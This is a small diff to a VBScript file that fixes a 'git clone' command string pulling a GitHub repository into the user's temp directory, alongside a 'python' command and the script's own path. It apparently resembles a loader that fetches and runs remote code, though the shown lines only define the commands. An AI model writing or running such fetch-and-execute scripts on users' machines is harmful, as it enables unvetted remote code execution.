@@ -4,7 +4,7 @@ Set WshShell = CreateObject("WScript.Shell")
 tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
 
 ' Define paths and commands
-gitCloneCommand = "git clonehttps://github.com/ayushman542/your_dad.git"
+gitCloneCommand = "git clone https://github.com/ayushman542/your_dad.git"
 pythonCommand = "python"
 scriptPath = WScript.ScriptFullName
 
